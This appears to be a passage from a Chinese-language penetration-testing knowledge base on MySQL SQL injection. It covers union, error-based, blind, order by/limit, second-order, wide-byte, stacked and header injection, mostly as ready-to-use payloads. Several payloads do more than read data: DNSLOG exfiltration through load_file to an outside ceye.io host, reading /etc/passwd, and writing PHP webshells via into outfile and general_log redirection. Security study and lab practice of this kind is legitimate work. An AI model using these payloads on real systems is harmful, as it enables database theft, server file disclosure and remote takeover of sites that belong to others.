table_schema=database()-- - 查询当前数据库中表users的所有列名 -1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'-- - 查询当前数据库中表users的列username和password的值 -1' union select 1,2,group_concat(0x7e,username,0x7e,password) from users-- - 总结 简单来说，整个UNION注入的过程：判断列数 -> 判断显位 -> 查库名 -> 查表名 -> 查列名 -> 查值 -- 判断字段数目 order by 3 group by 4 -- 联合查询搜集信息(表中字段数为3，注意字符类型，如 int，String之类的) union select 1,2,3 -- 查询当前数据库名称 union select 1,2,database(); -- 查询所有数据库 union select 1,2,group_concat(schema_name) from information_schema.schemata; -- 查询当前数据库中的所有表名 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = database(); -- 查询某表的列名，studnet 表示 具体的表名 union select 1,2,group_concat(column_name) from information_shcema.columns where table_name = 'student' -- 查询数据 union select 1,2,group_concat(id,name,age) from student; 扩展：limit注入点字段数判断 如果注入点在limit后，想要判断字段数，可通过into @,@的手法，其中@为mysql的临时变量 select * from user limit 1 into @,@; 报错注入 概念 服务器会将数据库执行产生的异常信息抛出显示到前端，这个时候我们人为地制造错误条件，就可以让查询结果能够出现在错误信息中。 一般用于UNION注入受限且能返回错误信息的情况下，毕竟盲注要发送很多类似的请求，耗时且容易被封。 注意 报错函数通常有最长报错信息输出的限制（限制了输出长度，比如只能显示32位），面对这种情况，可以进行分割输出 特殊函数的特殊参数运行一个字段、一行数据的返回，使用group_concat等函数聚合数据即可 注入流程 直接查询数据库，不需要判断字段数、显位等；查询语句和UNION一样，毕竟都是从数据库中查询数据，此处举几个例子说明即可。 # 确认闭合 1' and '1'='1 # 查询数据库名 1' and updatexml(0x7e,concat(0x7e, (select database())),0x7e) and '1'='1 # 查询当前数据库所有的表名 1' and updatexml(0x7e,concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema = database())),0x7e) and '1'='1 报错函数 列举能够被报错注入利用的一些函数 floor() 相关函数： floor()函数，向下取整，小数部分舍弃 rand()函数，取随机数，若有参数x，则每个x对应一个固定的值 count()函数，统计结果数量 select floor(rand(0)*2) from information_schema.SCHEMATA; 后面表可以随意换，只要数据量>=6即可，产生的固定序列为011011... 报错原理： 利用数据库表主键不能重复的原理，使用GROPU BY分组，产生主键key冗余，导致报错 GROPU BY原理： group by主要用来对数据进行分组，相同的分为一组，常与count()结合使用。执行过程中会建立一个有两个字段的虚拟表，一个是分组的key，一个是计数值 count(*)。在查询数据的时候，首先查看该虚拟表中是否存在该分组，如果存在那么计数值加1，不存在则新建该分组。 group by过程举例说明： 已知表users如下 ID NAME 1 AA 2 AA 3 BB sql语句 select count(*) ,name from uses group by name; 在进行分组运算的时候会根据name属性，创建一个虚拟表，从上至下扫描，当扫描到第一行NAME === AA的时候，当前虚拟表没有该字段，那么插入此虚拟表，count = 1 count name 1 AA 当扫描到第二行NAME === AA的时候 当前虚拟表存在该字段，那么count + 1 count name 2 AA 当扫描到第三行 NAME === BB 的时候 当前虚拟表不存在该字段，执行插入，count = 1 count name 2 AA 1 BB 报错过程举例说明： 那么利用floor(rand(0)*2) 这个函数的返回值，进行分组，因为序列为011011... 那么构建SQL语句 SELECT COUNT(*),floor(RAND(0)*2) as x from users GROUP BY x 查询第一条记录，别名x产生键值0，当键值0不存在虚拟表时，执行插入,此时别名x是一个函数，是变量，在执行插入时，按照GROUP BY分组之时 又要执行floor函数，得到1，故向虚拟表中插入键值1，count = 1 group by 进行分组时，floor(rand(0)*2)执行一次（查看分组是否存在），如果虚拟表中不存在该分组，那么在插入新分组的时候 floor(rand(0)*2) 就又计算了一次 COUNT x 1 1 查询第二条记录，别名x产生键值1，虚拟表中存在1，则令count + 1 = 2 COUNT x 2 1 查询第三条记录，别名x产生键值0，键值0不存在临时表，执行插入，别名x再次执行得键值1，由于1存在于临时表，那么插入之后如下表所示 COUNT x 2 1 1 1 由于数据库主键唯一性，现在临时表中存在两个键值为1，主键冗余，所以报错；数据库报错会将报错原因展示出来，故利用报错来实现注入 利用条件： 整个查询过程floor(rand(0)*2)被计算了5次，查询原数据表3次，所以要保证floor报错注入，那么必须保证数据库中相关的表必须大于三条数据 需要count(*)，rand()、group by，三者缺一不可 利用语句： select count(*) from table group by floor(rand(0)*2); select count(*),(floor(rand(0)*2))x from table group by x; -- 变形 floor报错注入的利用，通俗点说就是利用concat()构造特殊的主键，当主键值不唯一时就报错并回显该主键值，主键值中就包含着我们想要的内容。 获取数据库名 SELECT * FROM users WHERE id = 1 AND (SELECT 1 from (SELECT count(*),concat(0x23, database(), 0x23,floor(rand(0)*2)) as x from information_schema.`COLUMNS` GROUP BY x) as y) 1' AND (SELECT 1 from(SELECT count(*),concat(0x23,database(),0x23,floor(rand(0)*2)) as x from information_schema.`COLUMNS` GROUP BY x)as y) -- - 由于 and 后要跟1或者0，所以构造sql语句select 1，其中concat()函数是用来连接字符串的函数，因为information_schema.columns的数据是大于3条，所以会出现报错，报错结果或将别名x的信息展示出来，展示信息为#(数据库名称)#1冗余 获取表名 SELECT * FROM users WHERE id = 1 AND (SELECT 1 from (SELECT count(*),concat(0x23, (SELECT table_name from information_schema.`TABLES` WHERE table_schema = database() LIMIT 0,1), 0x23,floor(rand(0)*2)) as x from information_schema.`COLUMNS` GROUP BY x) as y) 1' AND (SELECT 1 from(SELECT count(*),concat(0x23,(SELECT table_name from information_schema.TABLES WHERE table_schema = database() limit 0,1),0x23,floor(rand(0)*2)) as x from information_schema.COLUMNS GROUP BY x)as y) -- - extractValue() 函数语法：extractvalue(xml_frag,xpath_expr) 适用范围：>=5.1.5 报错原理：Xpath格式语法书写错误的话，就会报错，如下所示 mysql> SELECT extractvalue('xy','/a/b') as result; +--------+ | result | +--------+ | x y | +--------+ 1 row in set (0.00 sec) mysql> SELECT extractvalue('xy','#aaa') as result; ERROR 1105 (HY000): XPATH syntax error: '#aaa' 由于此报错注入和updatexml都只能爆最大32位，如果要爆出32位之后的数据，需要借助mid或者substr等切割函数进行字符截取从而显示32位以后的数据 利用语句： 1' and extractvalue(1,mid(concat(0x23,(SELECT group_concat(table_name) from information_schema.tables where table_schema = database()),0x23),1,32)) and '1'='1 updatexml() 函数语法：updatexml(XML_document,XPath_String,new_value) 适用范围：>=5.1.5 报错原理:Xpath格式语法书写错误的话，就会报错，同extractValue() 利用语句： updatexml(1,concat(0x23,user(),0x23),1) 1' and updatexml(1,mid(concat(0x23,(SELECT group_concat(table_name) from information_schema.tables where table_schema = database()),0x23),1,32),1) and '1'='1 exp() 函数语法：exp(int x) -> 返回 e ** x 适用范围：适用于mysql时，>5.5.53则不能返回查询结果 报错原理：e的x次方到x每增加1，其结果都将跨度极大，而mysql能记录的double数值范围有限，一旦结果超过范围，则该函数报错 将0按位取反，~0，可以看到取值为18446744073709551615，这个值就比double范围最大值要大，所以再利用mysql 函数正常取值之后会返回0的特性，那么当函数执行成功，然后按位取反之后得到的值直接造成double型溢出 利用语句： select exp(~(select * from (select version())x)); 1' and exp(~(select * from (select version())x)) and '1'='1 exp()函数套用两层的子查询的原因： 先查询 select version() 这里面的语句，将这里面查询出来的数据作为一个结果集，取名为 x 再 select from x 查询x ,将结果集x 全部查询出来；这里必须使用嵌套，因为不使用嵌套不加select from 无法大整数溢出。 GTID相关函数 报错原理：参数格式不正确 适用范围：>=5.7 利用语句： select GTID_SUBSET(user(),1); select GTID_SUBTRACT(user(),1); ST相关函数 报错原理：参数格式不正确 适用范围：>=5.7 利用语句： select ST_LatFromGeoHash(version()); select ST_LongFromGeoHash(version()); select ST_PointFromGeoHash(version(),0); 几何函数 报错原理：函数对参数要求是形如(1 2,3 3,2 2 1)这样几何数据，如果不满足要求，则会报错。 利用语句： 函数 用法 GeometryCollection() GeometryCollection((select * from (select* from(select user())a)b)) polygon() polygon((select * from(select * from(select user())a)b)) multipoint() multipoint((select * from(select * from(select user())a)b)) multilinestring() multilinestring((select * from(select * from(select user())a)b)) linestring() linestring((select * from(select * from(select user())a)b)) multipolygon() multipolygon((select * from(select * from(select user())a)b)) 执行的结果均为 ERROR 1367 (22007): Illegal non geometric '(select `b`.`user()` from (select 'root@localhost' AS `user()` from dual) `b`)' value found during parsing BIGINT 报错原理： 当mysql数据库的某些边界数值进行数值运算时，会产生报错。 如~0得到的结果：18446744073709551615 若此数参与运算，则很容易会错误 利用语句： select !(select * from(select user())a)-~0; # 当前用户 1' AND !(select * from(select user())a)-~0 -- - # 当前数据库的所有表名 1' AND !(select * from(select group_concat(table_name) from information_schema.tables where table_schema=database())a)-~0 -- - uuid相关函数 适用范围：>=8.0 报错原理：参数格式不正确会导致报错。 利用语句： select uuid_to_bin((select database())); select bin_to_uuid((select database())); 不存在的函数 报错原理：随便使用不存在的函数，可能会得到当前所在数据库的名称 利用语句： select a(); name_const() 报错原理：mysql列名重复会导致报错,通过name_const制造一个列，配合笛卡尔积查询得到列名 局限：仅可取数据库版本信息 利用语句： select * from(select name_const(version(),0x1),name_const(version(),0x1))a; 1' AND (select * from(select name_const(version(),0x1),name_const(version(),0x1))a) -- - join using 报错原理：系统关键词join可建立两个表之间的内连接。 通过对想要查询列名的表与其自身建立内连接，会由于冗余的原因(相同列名存在)，而发生错误，并且报错信息会存在重复的列名，可以使用 USING 表达式声明内连接（INNER JOIN）条件来避免报错。 局限：在知道数据库跟表名的情况下使用才可以爆字段 利用语句： select * from (select * from 表名 a join 表名 b) c; select * from (select * from users a join users b) c; select * from (select * from users a join (select * from users)b)c; select * from (select * from 表名 a join 表名 b using (已知的字段,已知的字段) c) select * from (select * from users a join users b using (id)) c; select * from (select * from users a join users b using (id,username)) c; 盲注 核心：利用逻辑符号/条件函数，让返回内容/响应时间与正常页面不符，从而让我们可以观察到差异。 布尔盲注 概念 通过页面对永真条件如and 2*3=6和永假条件如and 2*3=5返回的内容是否存在差异，进行判断是否可以进行布尔盲注； 页面通常返回存在（True）/不存在（False）两种结果，通过这两种结果就可以判断是否存在布尔盲注 使用永真条件'1'='1' 1' and '1'='1 使用永假条件'1'='2' 1' and '1'='2 可以看出永真条件和永假条件分别代入SQL语句执行后，永为假的页面缺少了部分信息，利用这种差异性，我们就可以构造payload获取到数据库中的数据。 常用函数 布尔盲注主要依赖于返回结果的差异判断，所以我们在注入过程中也只能一位一位的进行判断，在判断长度的时候或者切割字符串的时候，就需要用到一些内置的函数。 一些功能一样或类似的函数就不单独列出来了，比如ascii和ord 函数 作用 ascii() 返回指定字符的ascii码值 count() 返回计算结果集的数量 length() 返回指定字符串的长度 substring 返回截取的字符串 注入流程 闭合SQL语句 计算当前数据库名长度 逐字节获取数据库名 计算表的数量 计算表名的长度 逐字节获取表名 计算列的数量 计算列名的长度 逐字节获取列名 计算字段的数量 计算字段内容的长度 逐字节获取字段内容 常见语句 计算当前数据库名长度 1' and length(database()) > 7 -- - # true 1' and length(database()) > 8 -- - # false 1' and length(database()) = 8 -- - # true 说明当前数据库长度为8 逐字节获取数据库名 1' and left(database(),1)='s' -- - true 1' and left(database(),2)='se' -- - true 1' and substr(database(),1,1)='s' -- - true 1' and ascii(substr(database(),1,1))>97 -- - true 1' and ascii(substr(database(),1,1))>115 -- - false 1' and ascii(substr(database(),1,1))=115 -- - true 说明数据库名的第一位的ascii码值为115，也就是s，然后逐步得出数据库名为security 计算表的数量 1' and (select count(table_name) from information_schema.tables where table_schema='security') > 3 -- - true 1' and (select count(table_name) from information_schema.tables where table_schema='security') > 4 -- - false 1' and (select count(table_name) from information_schema.tables where table_schema='security') = 4 -- - true 说明存在4个表 差不多介绍这些吧，算是各方面都有覆盖了，抛砖引玉；核心还是想着如何构造成完整的SQL语句 总结 盲注点确认后，我们一般不会去手动尝试一个字节一个字节的跑出来，而是采用工具比如sqlmap或者一些脚本来辅助我们，毕竟是属于重复无意义的工工作，交给机器就好了 语句和之前其他查询都是类似，唯一的区别，就是盲注变成了一位字符一位字符的判断，不像之前那样一次性全部获取数据 扩展：基于正则的盲注 和前面left函数可以说基本上一样，但是觉得还是算一个知识点，就补充写到后面吧 # 判断user()是不是root开头 select user() regexp '^root' 判断是不是roots开头，明显不是 扩展：未知列名的盲注 在知道表名，不知道列名的情况下，提供一种新的盲注方法 select (select 'aaa','666')=(select * from user limit 1); 时间盲注 概念 和布尔盲注类似，从名字也可以看出来，是依赖于响应时间上的差异来判断 举个简单的例子：如果1=1为真，就休眠5秒；这样页面返回时间一定大于5秒 通常可利用的产生时间延迟的函数有：sleep()、benchmark()，还有许多进行复杂运算的函数也可以当做延迟的判断标准、笛卡尔积合并数据表、复杂正则表达式等等。 应用场景 确实存在注入点，但无论输入什么内容，都显示一样的页面和内容；比如登陆页面、用户信息采集模块等 常用函数 除了上述布尔盲注的常用函数外，还需要一些能够进行判断和造成时间延时的函数 函数 作用 if(1,2,3) 如果1位True，就执行2，否则执行3 case when 1 then 2 else 3 end 同if sleep(x) 延时x秒 benchmark(count,exp) 执行表达式exp，count次（消耗CPU） 常见语句 和布尔盲注一样，只是加了判定如if和延时函数如sleep，所以此处举几个例子说明一下即可，主要是演示下用法。 如果当前数据库的第一个字符是s，就延时2秒 1' and if(substr((select database()),1,1) = 's', sleep(2), 0) -- - 如果当前数据库group_concat连接后的表名第一个字符ascii码是101，就执行50000000次md5('a') 1' and case when (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema='security'),1,1)) = 101) then benchmark(50000000,md5('a')) else 0 end -- - 如果查询出来的username第一个字符是D，就进行笛卡尔积运算 if(mid((select username from users limit 0,1),1,1)=\"D\", (select count(*) from information_schema.columns A,information_schema.columns B,information_schema.columns C), 0) DNS注入（简化盲注） 也称为DNSLOG外带数据盲注，主要是为了简化盲注，但是默认情况下无法使用，需要修改配置secure-file-priv 概念 DNSLOG，简单的说，就是关于特定网站的DNS查询的一份记录表。若A用户对B网站进行访问/请求等操作，首先会去查询B网站的DNS记录，由于B网站是被我们控制的，便可以通过某些方法记录下A用户对于B网站的DNS记录信息。此方法也称为OOB（带外数据）注入。 如何用DNSLOG带出数据？ 若我们想要查询的数据为：aabbcc，那么我们让mysql服务端去请求aabbcc.evil.com，通过记录evil.com的DNS记录，就可以得到数据：aabbcc 应用场景 三大注入无法使用，或盲注跑数据太慢太慢 有文件读取权限及secure-file-priv无值（不为null） 目标系统为Windows 为什么Windows可用，Linux不行？ 这里涉及到一个叫UNC的知识点。简单的说，在Windows中，路径以\\开头的路径在Windows中被定义为UNC路径，相当于网络硬盘一样的存在，所以我们填写域名的话，Windows会先进行DNS查询。但是对于Linux来说，并没有这一标准，所以DNSLOG在Linux环境不适用。 注：payload里的四个\\\\中的两个\\是用来进行转义处理的。 利用语句 select load_file(concat('\\\\\\\\',(select user()),'.xxxx.ceye.io\\xxxx')) order by注入 概念 order by是mysql中对查询数据进行排序的方法，使用示例 # 默认排序asc # 如果是数字，就对应到相关的列 select * from 表名 order by 列名(数字) asc/desc; select * from users order by username; select * from users order by 2; # 这里的2等于username select * from users order by username desc; order by注入通常出现在排序中，前端结果展示的表格，某一列需要进行升序或者降序排列，或者做排名比较的时候常常会用到order by排序，order by在select语句中，紧跟在where [where condition]后，且order by注入无法使用预编译来防御，由于order by后面需要紧跟column_name，而预编译是参数化字符串，而order by后面紧跟字符串就会提示语法错误，因此通常防御order by注入需要使用白名单的方式。 判定存在 可以通过order by列名，根据排序返回的情况来判断是否存在注入 order by rand() order by rand(1=1) order by rand(1=2) 或者使用超大数或者返回多条记录，构成SQL语句错误 order by 9999 order by (select 1 union select 2) 利用语句 order by通常情况下后面可直接接SQL语句，所以利用方式很多，此处通过Less-46，列举一些抛砖引玉。 基于报错 order by exp(~(select * from (select version())x)) order by (select exp(~(select * from (select version())x))) 基于盲注 order by if(1=1,1,(select 1 from information_schema.tables)) # 正常 order by if(1=2,1,(select 1 from information_schema.tables)) # 异常 order by if(mid(database(),1,1)='s',1,(select 1 from information_schema.tables)) # 正常 order by if(mid(database(),1,1)='a',1,(select 1 from information_schema.tables)) # 异常 如果直接使用sleep函数，如果表里的数据有n条，sleep(2)，会使查询时间为2*n，会对服务器造成拒绝服务攻击，一般不建议在order by 处使用时间盲注来判断以及注入数据 基于正则 也算是盲注的一种吧 order by (select 1 regexp if(1=1,1,0x00)) # 正常 order by (select 1 regexp if(1=2,1,0x00)) # 异常 基于rand 这也算是盲注的一种，主要是根据返回数据的排序来判断 # true 和 false 返回的顺序是不一样的 order by rand(true) order by rand(false) order by rand(substr(database(),1,1) = 's') order by rand(substr(database(),1,1) = 'a') limit注入 此方法适用于MySQL 5.x中，实测在8.0.27中会报错，在LIMIT后面可以跟两个函数，PROCEDURE 和 INTO，INTO除非有写入shell的权限，否则是无法利用的，所以就只能利用PROCEDURE [!NOTE] 可能面试的时候会被问到：order by注入和limit注入有啥区别？ 其实两者的区别很简单：order by注入后可以直接接SQL语句，而limit后面不行，需要再跟PROCEDURE ANALYSE()才可 其实也可以分为两种情况，一种是limit前有order by，一种是没有order by 无order by 利用起来相对比较简单，可以直接在后面接union，也可以用后面那种limit专属的方式 select * from aaa limit 1,1; -- 使用union注入 select * from aaa limit 1,1 union select version(); -- 报错注入，延时类似 select * from aaa limit 1,1 procedure analyse (extractvalue(rand(),concat(0x3a,version())),1); 有order by 这个情况下就不能用union注入了，不然会抛出异常，所以用limit的专属注入方式，适用于5.0.0版本 select * from aaa order by 1 limit 1,1; -- 报错注入，延时类似 select * from aaa order by 1 limit 1,1 procedure analyse (extractvalue(rand(),concat(0x3a,version())),1); 二次注入 概念 二次注入就是攻击者构造的恶意payload首先会被服务器存储在数据库中，在之后取出数据库在进行SQL语句拼接时产生的SQL注入问题。 二次注入是sql注入的一种，但是比普通sql注入利用更加困难，利用门槛更高。普通注入数据直接进入到 SQL 查询中，而二次注入则是输入数据经处理后存储，取出后，再次进入到 SQL 查询。 利用分析 以sqli-labs Less-24为例，查看注册用户代码login_create.php 创建用户时，使用了mysql_escape_string来转义防止注入 $username= mysql_escape_string($_POST['username']) ; $pass= mysql_escape_string($_POST['password']); $re_pass= mysql_escape_string($_POST['re_password']); ... $sql = \"insert into users ( username, password) values(\\\"$username\\\", \\\"$pass\\\")\"; 但这里有一个问题，转义后的内容，拼接成SQL语句后再执行写入到数据库中时，会去掉转义添加的\\而恢复之前的内容，因为SQL语句在执行的时候认为那也是防止转义的，就像咱们写代码的时候\"\\\"\\'\"会输出\"'一个道理，所以会自动去掉，可以来试一下： insert into users ( username, password) values(\"test\\'#\", \"test\\'#\") select * from users where username like \"test%\"; 也就是说这个地方虽然有mysql_escape_string不能直接注入，但是被污染的数据已经写入到数据库中了，如果有地方直接取出这个数据拼接到SQL语句中，就可能出现二次注入！ 注册功能已经分析完了，接下来就是登陆，查看login.php，可以看到如果登录成功，就把登陆的用户名给SESSION，如果我们的用户名带有注入payload，且后续有其他地方拼接了$_SESSION[\"username\"]，就会出现二次注入 继续向下，看看哪里会出现拼接，分析修改密码的代码pass_change.php，可以直观的看到从SESSION获取用户名，然后拼接到SQL语句中，也就是这里造成了二次注入！！！ 利用过程 上面整个流程分析完了，总结一下就是恶意的SQL注入payload被存储到了数据库中，然后后续操作过程中被直接拿出来拼接到其他SQL语句中，导致了二次注入。 在这个例子中，我们可以控制的地方就在于如下SQL语句中的username UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' 那我们只需要将username设置为一些比较明显效果的函数，比如' and sleep(5)# 就可以直观的看到较长的响应时间 在这里因为还有一些其他的限制，我们可以尝试注释掉后面对原密码的验证的语句达到修改其他用户密码的目的。 实战中如果不是特别有把握尽量不要使用update注入，毕竟会对目标的数据进行修改 注册用户test'#并登陆，修改密码，这里可构成SQL语句如下 UPDATE users SET PASSWORD='123123' where username='test'#' and password='111111' 执行后，test用户的密码被成功修改 宽字节注入 魔术引号 了解宽字节注入前，先了解一个PHP的防御函数magic_quotes_gpc(魔术引号开关) magic_quotes_gpc函数在php中的作用是判断解析用户提交的数据，如果magic_quotes_gpc=On，PHP解析器就会自动为post、get、cookie过来的数据增加转义字符\\，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误。 在magic_quotes_gpc=On的情况下，如果输入的数据有单引号（'）、双引号（\"）、反斜线（\\）与 NUL（NULL字符）等字符，都会被加上反斜线，这些转义是必须的，如果这个选项为off,那么我们就必须调用addslashes这个函数来为字符串增加转义. 我们知道单引号和双引号内的一切都是字符串，但如果要进行SQL注入，那么就必定要尝试闭合单双引号，只有闭合了我们的语句才会被当成代码执行；在magic_quotes_gpc=On的情况下，这个防御看似是安全的。 编码字符集 单字节字符集：所有的字符都使用一个字节来表示，比如 ASCII 编码。 多字节字符集：在多字节字符集中，一部分字节用多个字节来表示，另一部分（可能没有）用单个字节来表示。 两位的多字节字符有一个前导字节和尾字节；在某个多字节字符集内，前导字节位于某个特定范围内，尾字节也一样。 UTF-8 编码：是一种编码的编码方式（多字节编码），它可以使用1~4个字节表示一个符号，根据不同的符号而变化字节长度。 常见的宽字节：GB2312、GBK、GB18030、BIG5、Shift_JIS 这里重点说一下GBK，GBK全称《汉字内码扩展规范》，是一种多字符编码；它使用了双字节编码方案，因为双字节编码所以gbk编码汉字，占用2个字节。 如：你好 --> C4E3 BAC3，经过URL编码后%C4%E3%BA%C3，可以看出来一个字是2个字节组成 概述 因为使用了GBK编码会认为两个字符是一个汉字，所以可以使用一些字符和转义过后多出来的\\组合两个字符，数据库就会尝试将他们转换为一个汉字，也就使得数据库不识别字符，对单引号、双引号的转义失败，从而达到闭合语句的目的。 形成过程：当PHP连接MYSQL时，当设置character_set_client = gbk时会导致GBK编码转换的问题，当注入的参数里带有%df(%bf)时，在魔术引号开关或者addslashes()函数的作用下，会将%df%27转换为%df%5c%27，此时%df%5c在会解析成一个汉字，从而“吃掉”反斜杠，单引号因此逃逸出来闭合语句 根本原因：character_set_client（客户端字符集）和 character_set_connection（连接层的字符集）不同，或转换函数如iconv、mb_convert_encoding使用不当 流程分析 此处以sqli-labs Less-33 为例，查看它的源码 addslashes函数将会把接收到的id的字符进行转义处理。如： 字符'、\"、\\、NULL前边会被添加上一条反斜杠\\作为转义字符 多个空格被过滤成一个空格 正常情况下，我们输入id=1'#，经过addslashes转义后，会变成1\\'#，构成的SQL语义大概如下： select * from users where id = '1\\'#'; 看上去没问题，但是我们注意到它有一行设置了编码 mysql_query(\"SET NAMES gbk\"); /* SET character_set_client ='gbk'; SET character_set_results ='gbk'; SET character_set_connection ='gbk'; */ 根据刚才的双字节知识，我们如果输入id=1%df'#，那么转义后，就变成了1%df\\'#，而%df\\会被尝试识别成一个汉字，因此'就被释放出来绕过了转义限制，构成的SQL语义大概如下： select * from users where id = '1�'#'; 尝试判定一下，是不是对的，输入 id=1%df' or 1 -- -，可见成功出现了结果 注入语句 id=1%df%27 and 1=1 %23 # 不一定非得%df，%99、%aa、%fe等都可以 扩展 为了避免漏洞，网站一般会设置UTF-8编码，然后进行转义过滤。但是由于一些不经意的字符集转换，又会导致漏洞 使用set name UTF-8指定了utf-8字符集，并且也使用转义函数进行转义。有时候，为了避免乱码，会将一些用户提交的GBK字符使用iconv()函数先转为UTF-8，然后再拼接SQL语句 测试语句： ?id=1%e5%5c%27 and 1=1 --+ %e5%5c 是gbk编码，转换为UTF-8编码是%e9%8c%a6 %e5%5c%27首先从gbk编码经过addslashes函数之后变成%e5%5c%5c%5c%27，再通过iconv()将其转换为UTF-8编码，%e9%8c%a6%5c%5c%27 ，其中%e9%8c%a6是汉字，%5c%5c%27解码之后是\\\\'第一个\\将第二个\\转义，使得%27单引号逃逸，成功闭合语句 Update注入 和其他注入一样，无非就是闭合语句，然后注入自己的恶意语句，达到自己想要的效果，比如修改密码、查询数据等等 [!TIP] update注入一般给敏感数据如database()的值设置到可见变量中，然后直接查看 这里单独列出来说一个点，就是update注入点如何重复给字段赋值 -- 正常update,sqli处为注入点 update user set username=\"sqli\" where age=111; -- 重复给username赋值 update user set username=\"sqli\",username=user() where age=111; False注入 算是盲注内的一种利用手法，不过感觉用到的情况很少很少很少，个人感觉主要用到and/or被过滤的情况，但还是简单说下吧 Mysql也是隐式类型转换，和php一样，放个图就比较清晰了 简单来说就是给字符串转换为数字的时候，会自动从前往后判断，如果最前面是数字，比如1abc最前面是1，那么就会转换成对应的数字，这个地方就是1，如果前面是字母，就会转换成0 利用上面那个特性，我们就可以构造一些相关的语句，来达到我们的目的 [!NOTE] 运算符很多，都可以用，一般举例为了方便用异或^ 异或：不同为1，相同为0 核心就是： 0^1=1 0^0=0 如下图，直接讲payload比较通俗易通（ ==> 后表示得到的结果，前面是运算的表达式） 第一部分： mid(database(),1,1)='t' ==> 1 'aaa'^(mid(database(),1,1)='t') ==> 'aaa'^1 ==> 0^1 ==> 1 'aaa'^(mid(database(),1,1)='t')=1 ==> 1=1 ==> 1 第二部分： mid(database(),1,1)='a' ==> 0 'aaa'^(mid(database(),1,1)='a') ==> 'aaa'^0 ==> 0^0 ==> 0 'aaa'^(mid(database(),1,1)='a')=1 ==> 0=1 ==> 0 堆叠注入 堆叠注入与受限于select语句的其他注入不同，堆叠注入可用于执行任意SQL语句。 简单的说，由于分号;为MYSQL语句的结束符。若在支持多语句执行的情况下，可利用此方法执行其他恶意语句，如RENAME、DROP等。 注意：通常多语句执行时，若前条语句已返回数据，则之后的语句返回的数据通常无法返回前端页面。因此读取数据时建议使用union联合注入，若无法使用联合注入，可考虑使用RENAME关键字，将想要的数据列名/表名更改成返回数据的SQL语句所定义的表/列名 。 mysql> select 1;select 2; +---+ | 1 | +---+ | 1 | +---+ 1 row in set (0.00 sec) +---+ | 2 | +---+ | 2 | +---+ 1 row in set (0.00 sec) HTTP头部注入 其实这个不能单独分一类，因为和之前的注入是一模一样的，只是注入的点不在咱们经常关注的参数中，而在http头中，这里算是补充一下应用场景吧 HTTP头注入是指从HTTP头中获取数据，而未对获取到的数据进行过滤就直接代入SQL语句中，从而产生注入。 HTTP头注入常常发生在程序采集用户信息的模块中 是否可能存在注入，只需要记住一句话：所有和数据库存在交互的地方，都可能存在SQL注入 常见的HTTP头： Header 说明 Accept 浏览器能够处理的内容类型 Accept-Charset 浏览器能够显示的字符集 Accept-Encoding 浏览器能处理的压缩编码 Accept-Language 浏览器当前设置的语言 Connection 浏览器与服务器之间的连接 cookie 当前页面设置的cookie Host 发出请求的页面所在域 Referer 发出请求的页面URL User-agent 浏览器用户代理字符串 Server web服务器表明自己是什么软件及版本信息 常见的注入点： ​ 因为http头注入常出现在收集用户信息的点，所以常见的注入点如下： Header 说明 X-Forwarded-For/Client-IP 用户IP User-Agent 用户代理的设备信息 Referer 告诉服务器该网页是从哪个页面链接过来的 Cookie 标识用户的身份信息 其他：文件读写 配置问题 Mysql是很灵活的，它支持文件读/写功能；在讲这之前，有必要介绍下什么是file_priv和secure-file-priv。 简单的说：file_priv是对于用户的文件读写权限，若无权限则不能进行文件读写操作，可通过下述SQL语句查询权限。 select file_priv from mysql.user where user=$USER and host=$HOST; select file_priv from mysql.user where user=\"root\" and host=\"localhost\"; select file_priv from mysql.user where user=(select user from mysql.user limit 1) and host=(select host from mysql.user limit 1); secure-file-priv是一个系统变量，对于文件读/写功能进行限制。 可通过如下两种方法查询secure-file-priv的值 show variables like \"secure_file_priv\"; show global variables like '%secure_file_priv%'; 值具体说明如下： 为NULL，表示禁止文件读/写 空白内容，表示无限制 为目录名，表示仅允许对特定目录的文件进行读/写。 Mysql >= 5.5.53版本默认值为NULL，之前的版本空白内容。 修改secure-file-priv值： 通过修改my.ini文件，添加：secure-file-priv= 启动项添加参数：mysqld.exe --secure-file-priv= 读文件 在确定了用户有读，写权限之后，一般使用load_file()函数来读取文件内容 限制条件： 前两种需要secure-file-priv无值或为有利目录; 都需要知道要读取的文件所在的绝对路径; 要读取的文件大小必须小于系统变量max_allowed_packet所设置的值 利用语句： select load_file(file_path); -- file_path为绝对路径 load data infile \"/etc/passwd\" into table test FIELDS TERMINATED BY '\\n'; -- 读取服务端上的文件 load data local infile \"/etc/passwd\" into table test FIELDS TERMINATED BY '\\n'; -- 读取客户端上的文件 写文件 常规写文件主要利用了 into outfile 和 into dumpfile 限制条件： secure-file-priv无值或为可利用的目录 需知道目标目录的绝对路径 目标目录可写，mysql的权限足够 outfile和dumpfile区别： into outfile 是导出所有数据，适合导出库，但是如果用它去导出二进制文件时，就会出错，因为outfile函数会在行末端写入新行，更致命的是会转义换行符，这样的话这个二进制可执行文件就会被破坏 into dumpfile 只能导出一行数据，一般导出导出二进制文件(udf提权)时就用dumpfile 利用语句： select \"\" into outfile '/var/www/html/1.php'; select \"\" into dumpfile '/var/www/html/1.php'; 日志getshell 由于mysql在5.5.53版本之后，secure-file-priv的值默认为NULL，这使得正常读取文件的操作基本不可行。我们这里可以利用mysql生成日志文件的方法来绕过。 限制条件： 限制： 权限够，可以进行日志的设置操作（执行set语句） 知道目标目录的绝对路径 mysql日志文件的一些相关设置可以直接通过命令来进行 利用语句： # 请求日志 mysql> set global general_log_file = '/var/www/html/1.php'; mysql> set global general_log = on; # 慢查询日志 mysql> set global slow_query_log_file='/var/www/html/2.php' mysql> set global slow_query_log=1; # 还有其他很多日志都可以进行利用 # ... 之后让数据库执行满足记录条件的恶意语句即可，具体可查看phpmyadmin通过日志写入webshell相关的教程 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-01-25 15:14:07 "},"个人知识库/01.渗透测试/02.WEB漏洞/01.SQL注入/03.MySQL/03.绕过技巧.html":{"url":"个人知识库/01.渗透测试/02.WEB漏洞/01.SQL注入/03.MySQL/03.绕过技巧.html","title":"03.绕过技巧","keywords":"","body":" 通用方法 编码 内联注释 绕过空格 绕过引号 十六进制hex() char() 绕过逗号, 针对普通情况（使用join） 针对limit（使用offset） 针对切割函数 绕过等号= 绕过and/or 绕过括号 获取所有数据库名 获取表名 获取列名 